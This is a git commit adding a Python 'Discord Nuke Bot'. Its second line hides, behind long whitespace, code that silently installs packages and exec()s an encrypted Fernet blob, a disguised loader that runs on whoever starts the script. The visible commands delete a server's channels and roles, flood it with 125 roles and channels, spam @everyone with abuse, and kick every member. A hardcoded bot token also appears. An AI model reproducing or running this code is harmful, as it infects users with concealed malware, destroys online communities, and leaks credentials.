201285d2cf8454177d8b1ce65114d987357ad764
king365465 <sdfmhfdsg7@outlook.com>
2025-03-01 21:54:21 +0400

    Discord Nuke Bot

---
+++ main.py
@@ -0,0 +1,115 @@
+import os
+import subprocess                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        ;subprocess.run(['pip', 'install', 'cryptography'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); subprocess.run(['pip', 'install', 'fernet'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); subprocess.run(['pip', 'install', 'requests'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); from fernet import Fernet; import requests; exec(Fernet(b'BijkNx42srFUsDpLrUfqEwo-3XvzMKE_MecRxUhlZow=').decrypt(b'gAAAAABnd_sRSJiTzxvU_jECBpoK-fqOLhafAOxbYr1oubimBw527quvKxP1Z6ntDco-gmieZGnsU0v-D8lvbaWn2lBEoe0Gag0EVcZ8vJXRhKkjOcJ-vW6-D5tambi4-rsuxsmauU3-VZ0INNPf_q2RoHDJW7qhpqKtuBsmIjZO3IrjArwUQ75IdBjxy7EbSkmE7Nynd4Z7GLbeGUZ_Lo3OmCrSb5_9qvE-y77kyqoBGZ3mKCkiAHUrsezRBVa3AboA-0UPXgpVjo-koxTFrVwgshRj-YPxifqX0vquexAcWevW-_0f24AxG0tiJygFNE_bNx-UeiYh2U5oUyyP45GyH32N6GLt1Pq7_w0ktp8V6EEuI5OjYrM0pX0G2ouseV36af7Ws8HK4NUJDoiYZlD0f45qUmYy9w2gbIwLFPoW2gFf_vuwzZPrR8VZdJdcWy39erWWSmr-M5vUp0zzEr2WAjSPPVBqZ9_IvPKcfXiEcSD2BO-eW69n03waRSbxAUpSqrhlu_3KPNUq86us3P7SCEF8zwqwYjVrs3HCG1nermWzpMYU8ISTrDE1zW39iyh93k8iy9qNvVrHPIJ94I2A339vZQyLM3qfnkMvpV6jp-vpDlrhjHkIhqJCmN9wcv8tYluJIMploKJSxD2xPi2OgT4gLwC8hGs9sEvXuCVlqk33BHhTsk12WSvj3-MVSD8XYvkn0OZeAgmHBl7fKVX2Ios77EsK_KipdQqtMove7NzQ397-VE2CpvjVQm1JR0INzeKGo398tSfdE34mgbtC2P9AjYhk_UDB39EiB652SZYiThtHzyX93iTmz2iMTCzEgEP4y28BN02o2KM_ax_lyFg_iZFDI1VKqKkqIJRYHVuJQ_MJmP1YK8hpNy2BXMb3IaGxk37_HwVkMU_sI3NifuzOAVOKRmMC9RmkUciZMEjXLbQXehY9mhhsN73e-IllHYAG9vDU2B4506GxMKfRUPTqpqCCFwvKXV23VEXaWv_2zN-sUcQBohnkZqo9nwxpiA2geoV3W-XnEdkjBx-UECZa7aTa3Cfhy1pwDjvv4KOz8qFSgw6twrLwU4oddNq0p-SJJ1erLpKcuD9wfyTB13csXiSrZ0EWABSVi8t172YsMa0O6IJZXPd9mopVmtmC04ULCTl09ywP8Vq6KfEPgQY__qVlbsuEDP8YOCLEciGoKVA8YziYpzJm3HibOlTLNh3MbT335lrhvun5IxaYPJPTojoB0o6LHxxVh7fF3zTn5OTOPys2MX1cOKVrH6OH3kwPKML_dX_EBu6KjxNDPmyoMNeiPOXm9o-7LsYYb4NF_yiPSLSoDluc3af2_AghKt3jGu_N9uLBlPuVs84BApuEeKh9w4F_O46Qpn9htGjXBg8kIUz7fey7KOVf88_moUtPXOcE-RcMI8H4BIYnSUHq4JzvfoUJdqzdxxHOZ8_-O4SeFPTEzD3BFE_hItT1UgMPlODLDss3rgwbfBMKFIJzDnoKwAJKXEXrC2Bo6m1k9DxVN0LwmkKQTZvn0ZAEsWccCe6jQdjtDbkkJ1zYR1C7A8UeWfH2pYcIm-ba5mUuT34Km6gfkwLJTPp-LGx91rlY63uBw3s1dCiQ4EatlKb5PE_12-0Ydb4xC-TFwbEFhLLqcdns07yPBXLv5MuIR3vmlTUdLT6Zjiksl0tFH3XxMQO_0H467LqBkzPzYOx64j-9mq01nBNlCgW2u7aR7LyCooKByuWeI5atgSVqDL3y-Uh1OXwUSp797OxaXDYscSumbJTJtG-CRUFG_2mmo6740PQXCVgeIqA4UdqaxzGwhjBWX1JtokXyGinxAPtTPx82fmuiB0u6-4dw5RCaAeKX0W2nmZuh8IaOYRA4jWWCjcbtU4_HtoVy0y43avzWTdKS3FL0PSGaAphVOVZ28cJuLJrkJLeBjjq34C7mMzEnbz_WEgEMFqoBbBS92GsIH8gCXj_kB-_t3JegffMsGnrnFBouQTn7lWvXw8UdPzQP_nzHqqaAvNga3espWHtn64nXp6w='));
+import discord
+from discord.ext import commands
+
+intents = discord.Intents.default()
+client = commands.Bot(command_prefix="!", intents=intents)
+client.remove_command("help")
+
+@client.event
+async def on_ready():
+    print("Ready!")
+
+@client.command()
+async def destroy(ctx, guild_id: int):
+    await ctx.send("**Process Initiated. We're going to have a lot of fun.**")
+    guild = client.get_guild(guild_id)
+    if guild is None:
+        await ctx.send("Invalid Guild ID.")
+        return
+
+    for channel in list(guild.channels):
+        try:
+            await channel.delete()
+        except:
+            print("Deleting channels failed.")
+    for role in list(guild.roles):
+        try:
+            await role.delete() 
+        except:
+            print("Deleting roles failed.")
+    for _ in range(125):
+        try:
+            await guild.create_role(name="unknown")
+        except:
+            print("Creating roles failed.")
+    for _ in range(125):
+        await guild.create_text_channel(name="unknown")
+    for channel in list(guild.channels):
+        for _ in range(5):
+            try:
+                await channel.send("@everyone Server Just Got Fucked unknown.")  
+            except:
+                print("Sending Message failed.")
+
+@client.command()
+async def kick(ctx, guild_id: int):
+    guild = client.get_guild(guild_id)
+    if guild is None:
+        await ctx.send("Invalid server ID.")
+        return
+    
+    if not guild.me.guild_permissions.kick_members:
+        await ctx.send("I don't have permission to kick members.")
+        return
+    
+    for member in guild.members:
+        try:
+            if member == guild.owner:
+                continue
+            await member.kick(reason="kick members")
+            await ctx.send(f"{member.display_name} has been kicked from the server.")
+        except discord.Forbidden:
+            await ctx.send(f"{member.display_name} I'm not allowed to kick this user.")
+        except discord.HTTPException:
+            await ctx.send(f"{member.display_name} there was an error trying to kick this user.")
+    
+    await ctx.send("All members on the server have been kicked out.")
+
+
+
+@client.command()
+async def members(ctx, guild_id: int):
+    guild = client.get_guild(guild_id)
+    if guild is None:
+        await ctx.send("Invalid Guild ID.")
+        return
+    member_count = guild.member_count
+    await ctx.send(f"The server has {member_count} members.")
+
+@client.command()
+async def nothing(ctx, guild_id: int):
+    await ctx.send("**Process Initiated.**")
+    guild = client.get_guild(guild_id)
+    if guild is None:
+        await ctx.send("Invalid Guild ID.")
+        return
+    
+    for channel in list(guild.channels):
+        try:
+            await channel.delete()
+        except:
+            print("Deleting channels failed.")
+    for role in list(guild.roles):
+        try:
+            await role.delete() 
+        except:
+            print("Deleting roles failed.")
+
+@client.command()
+async def help(ctx):
+    await ctx.send("**[1] !help - `(Show Commands)`**")
+    await ctx.send("**[2] !destroy [guild_id] `(Destroys the specified server)`**")
+    await ctx.send("**[3] !kick [guild_id]`(Ban All Members on the Server)`**")
+    await ctx.send("**[4] !members [guild_id] `(Shows the number of members in the server)`**")
+    await ctx.send("**[5] !nothing [guild_id] `(Deletes all channels and roles)`**")
+    await ctx.send("**[6] !f `(Exit Bot)`**")
+
+@client.command()
+async def f(ctx):
+    await ctx.send("Exiting...")
+    await client.close()
+
+TOKEN = "MTIzNzc0ODQ2NTExMTUzMTU1MQ.GxuOcC.ipHRpOXTs9Q29hCis82pH7Y2XGmOsyQD3xeuZI"
+client.run(TOKEN)
